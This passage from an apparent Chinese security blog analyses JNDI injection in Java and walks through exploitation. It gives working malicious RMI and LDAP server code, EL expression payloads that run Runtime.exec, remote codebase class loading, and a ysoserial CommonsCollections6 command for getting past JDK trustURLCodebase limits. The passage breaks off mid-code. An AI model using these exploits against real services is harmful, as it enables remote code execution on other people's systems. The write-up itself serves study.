<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215165843328.png" alt="image-20211215165843328"></p>
<p>我们从开头看起：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215214221020.png" alt="image-20211215214221020">，首先RMIserver返回的应该是<strong>ResourceRef类</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215170157571.png" alt="image-20211215170157571"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215215944762.png" alt="image-20211215215944762"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215172007623.png" alt="image-20211215172007623"></p>
<p>那么我们现在又需要找一个class作为beanclass，且该class的构造函数为无参构造函数，执行方法的parameter类型需要为String</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215172428526.png" alt="image-20211215172428526"></p>
<p>自然我们想到了<strong>EL表达式</strong></p>
<p>下面是<strong>EL表达式</strong>执行<strong>calc</strong>的写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 下面的三种poc都可以 */</span></span><br><span class="line"></span><br><span class="line">String poc1=<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">String poc2=<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc3</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +<span class="string">&quot;.newInstance().getEngineByName(&#x27;nashorn&#x27;)&quot;</span> +<span class="string">&quot;.eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ELProcessor</span>().eval(poc1);</span><br></pre></td></tr></table></figure>

<p>一切都分析完毕，我们可以开始构造server端的代码了。</p>
<h2 id="代码构造"><a href="#代码构造" class="headerlink" title="代码构造"></a>代码构造</h2><p><strong>恶意Server端构造:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AlreadyBoundException, NamingException, ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.newInstance().getEngineByName(&#x27;nashorn&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc1</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass())&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc2</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.newInstance().getEngineByName(&#x27;JavaScript&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;hello=eval&quot;</span>));<span class="comment">//此处等号前面的hello必须和下一行的hello一样，因为等号前面的string会被放入hashmap作为key</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;hello&quot;</span>,poc));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里需要注意，在向resourceRef添加StringRefAddr的时候，需要保证</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;hello=eval&quot;</span>));<span class="comment">//等号前面的值和下面的addrType一样</span></span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;hello&quot;</span>,poc));</span><br></pre></td></tr></table></figure>

<p>假设不一样，如果下面的代码是<code>resourceRef.add(new StringRefAddr(&quot;x&quot;,poc));</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215220822913.png" alt="image-20211215220822913"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215220909325.png" alt="image-20211215220909325"></p>
<p>那么在之后获取method的时候，会返回空值。</p>
<p><strong>受攻击方：Test.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>除了查询了BeanFactory可以被利用，以及EL表达式的相关代码（因为不会）以外，其他均是我自己独立审计的过程，并未照抄代码去跟，希望能锻炼自己的代码审计能力。虽然依然很菜，但是感觉到了有明显的进步。</p>
<p>这一节写的很乱，但也是整个完整审计过程的复现。</p>
<h1 id="JNDI-LDAP注入"><a href="#JNDI-LDAP注入" class="headerlink" title="JNDI+LDAP注入"></a>JNDI+LDAP注入</h1><h2 id="由来-2"><a href="#由来-2" class="headerlink" title="由来"></a>由来</h2><p>为了绕过JNDI+RMI的限制，大佬们又盯上了JNDI+LDAP，LDAP服务也能返回JNDI Reference对象，利用过程与之前的JNDI+RMI基本相同。</p>
<blockquote>
<p><strong>在Oracle JDK 11.0.1、8u191、7u201、6u211之后</strong> com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
</blockquote>
<h2 id="攻击实现-1"><a href="#攻击实现-1" class="headerlink" title="攻击实现"></a>攻击实现</h2><p><strong>攻击方：自定义LDAP服务端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPInj</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), port,</span><br><span class="line">                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/#EvilLDAP&quot;</span>)));</span><br><span class="line">            <span class="comment">// 当前环境下如果没有EvilLDAP.class，则会去访问8080端口下的 /EvilLDAP.class</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用拦截器，来拦截修改返回entry的<strong>attribute</strong></p>
<p><strong>被攻击方: TEST.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="comment">//            //写法一 将codebase的地址写在lookup中</span></span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            context.lookup(<span class="string">&quot;ldap://127.0.0.1:7777/#EvilLDAP&quot;</span>);</span><br><span class="line">            <span class="comment">//写法二 预先设定环境，以hashtable的形式保存在context中</span></span><br><span class="line"><span class="comment">/*            Hashtable&lt;String,String&gt; env= new Hashtable&lt;String, String&gt;();</span></span><br><span class="line"><span class="comment">            env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span></span><br><span class="line"><span class="comment">            env.put(Context.PROVIDER_URL, &quot;ldap://localhost:7777&quot;);</span></span><br><span class="line"><span class="comment">            Context context = new InitialContext(env);</span></span><br><span class="line"><span class="comment">            context.lookup(&quot;#EvilLDAP&quot;);*/</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>**InitialContext()**是使用JNDI的接口</p>
<p>方法一直接将完整地址(包括服务类型)都写在lookup中，方法二预先设定相关codebase配置</p>
<h2 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h2><p>我们要了解，LDAP在使用<strong>search</strong>功能的时候，实质上，是会返回一系列<strong>entry</strong>,entry中会包含各种<strong>attributes</strong></p>
<p>举个例子，比如我想要查询某些数据，可以通过search的功能来搜索，例如：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214192038752.png" alt="image-20211214192038752"></p>
<p>它返回的不是object，而是<strong>attribute</strong>，因此，正常来说，这个<strong>search</strong> function是不存在RCE漏洞的。</p>
<p>在<strong>Blackhat 2016</strong>中大佬们有提到：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214191715523.png" alt="image-20211214191715523"></p>
<p><strong>LDAP</strong>中有个<strong>SearchConrols.setReturningObjFlag()<strong>，当它为true的时候，表明我们的返回结果中会包含一个instance，同时LDAP返回的entry会根据attribute来重新构建一个</strong>instance</strong>，，这一点我们先记住了。</p>
<p>触发的代码是<strong>lookup()</strong>,我们猜测是不是lookup()里面有instance呢？</p>
<p>调试一下<strong>被攻击方: TEST.java</strong>：</p>
<p>前面一系列的调用就不说了，关键在<strong>LdapCtx.c_lookup()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214192651508.png" alt="image-20211214192651508"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214192820056.png" alt="image-20211214192820056"></p>
<p>看到了熟悉的<strong>SearchControls</strong>、<strong>setReturningObjFlag</strong>和**doSearch()**方法。</p>
<p>继续往下走</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214204848798.png" alt="image-20211214204848798">,我们发现decodeObject()的参数是attributes，</p>
<p>进去看看：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214205501121.png" alt="image-20211214205501121"></p>
<p>继续跟进<strong>decodeReference()<strong>，发现里面就是在获取attributes的值，然后用这些attributes新建一个</strong>reference</strong>，最后返回。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214205834240.png" alt="image-20211214205834240"></p>
<p>然后回到**LdapCtx.c_lookup()<strong>，最后走到了</strong>getObjectInstance()**方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210111308.png" alt="image-20211214210111308"></p>
<p>往下发现了我们在之前Reference+RMI案例中一样的funciton - <strong>getObjectFactoryFromReference()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210233645.png" alt="image-20211214210233645"></p>
<p>接下来就是从远程codebase加载class</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210311439.png" alt="image-20211214210311439"></p>
<p>执行到loadClass,弹出了计算器。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210346103.png" alt="image-20211214210346103"></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下，JNDI+LDAP注入的流程</p>
<ul>
<li>JNDI的lookup()参数可控，攻击者修改参数为恶意的LDAP服务器地址</li>
<li>攻击者构造的LDAP服务器使用拦截器，修改response，在返回的entry中添加attributes - javaClassName, javaCodeBase, objectClass, javaFactory。</li>
<li>修改后的response被返回给客户端，客户端根据attributes重新生成一个reference类型的object，并通过该reference远程加载codebase上的恶意class</li>
</ul>
<p>整个流程到此结束。</p>
<h1 id="JNDI-LDAP绕过高版本JDK限制"><a href="#JNDI-LDAP绕过高版本JDK限制" class="headerlink" title="JNDI+LDAP绕过高版本JDK限制"></a>JNDI+LDAP绕过高版本JDK限制</h1><h2 id="由来-3"><a href="#由来-3" class="headerlink" title="由来"></a>由来</h2><p><strong>在Oracle JDK 11.0.1、8u191、7u201、6u211之后</strong> com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，那么我们能否绕过该检测呢？</p>
<h2 id="首次尝试"><a href="#首次尝试" class="headerlink" title="首次尝试"></a>首次尝试</h2><p>同样是将client的lookup()进行断点，我们跟到<strong>VersionHelper12.loadClass()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216214228623.png" alt="image-20211216214228623"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;<span class="comment">//此处会检测trustURLCodebase是否为真</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                URLClassLoader.newInstance(getUrlArray(codebase), parent);<span class="comment">//加载CLASS</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//不为真则返回空</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里返回空，导致我们无法RCE。</p>
<p>同样的，我们只能考虑加载本地Class</p>
<p>在**NamingManager.getObjectFactoryFromReference()**中，我们可以看到如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">    InstantiationException,</span><br><span class="line">    MalformedURLException &#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader 这里会查找本地path下的class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);<span class="comment">//找到后进行加载</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;<span class="comment">//加载后的Class在这里会被新建一个对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们注意到，加载后的class会被转换成<strong>ObjectFactory</strong>类，并新建一个<strong>instance</strong>。</p>
<p>因此我们需要找到一个<strong>implements ObjectFactory</strong>的class。</p>
<p>继续往下执行，返回到了<strong>DirectoryManager.getObjectInstance()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216220902748.png" alt="image-20211216220902748"></p>
<p>发现这里执行了<strong>factory.getObjectInstance()</strong>,还记得前面的<strong>JNDI+RMI绕过高版本JDK限制</strong>的章节吗，我们用到了BeanFactory来反射执行了<strong>ELProcessor</strong>，那在这里我们是否可以继续这样使用呢？答案是不可以。</p>
<p>在<strong>DirectoryManager.getObjectInstance()<strong>中，将ref转换成了Reference类，而我们的</strong>BeanFactory.getObjectInstance()<strong>中要求obj必须为</strong>ResourceRef</strong>。JNDI在接收到LDAP server传过来的entry后，会根据attribute重新生成Reference类的object，所以导致我们无法满足<strong>BeanFactory</strong>的要求。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216222112900.png" alt="image-20211216222112900"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216221823204.png" alt="image-20211216221823204"></p>
<p>所以我们不能利用本地Class中的BeanFactory来进行RCE的触发，还有没有其他办法呢？</p>
<h2 id="再次尝试之反序列化数据"><a href="#再次尝试之反序列化数据" class="headerlink" title="再次尝试之反序列化数据"></a>再次尝试之反序列化数据</h2><p><strong>Alvaro Muñoz 和Oleksandr Miroshhe</strong>在<strong>Black Hat</strong>提到了<strong>Entry Poisoning with Serialized Objects</strong>，正如我们之前所说，JNDI在接收到Entry后会根据其attributes来<strong>reconstruct a reference object</strong>。</p>
<p>有四种类型的java object representation可以被存储在Directory Service中：</p>
<ul>
<li>Serialized Objects(javaSerializedObject)<ul>
<li>JavaClassName, javaClassNames, javaCodebase, javaSerializedData</li>
</ul>
</li>
<li>JNDI References(javaNamingReference)<ul>
<li>JavaClassName, javaClassNames, javaCodebase, javaReferenceAddress, javaFactory</li>
</ul>
</li>
<li>Marshalled Objects(javaMarshalledObject)<ul>
<li>javaClassName, javaClassNames, javaSerializedData</li>
</ul>
</li>
<li>Remote Location(Deprecated)<ul>
<li>javaClassName, javaRemoteLocation</li>
</ul>
</li>
</ul>
<p>很明显，我们让传入的attributes是Serialized Objects的特征，这样我们就可以使用本地的gadgets了。</p>
<p>接下来，我将使用<strong>cc6</strong>的反序列化链来实现：</p>
<p>在windows上不能直接base64编码很麻烦，所以我把ysoserial的jar包拖到kali中生成</p>
<p><code>java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 &quot;calc&quot;|base64</code></p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><strong>恶意Server端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span 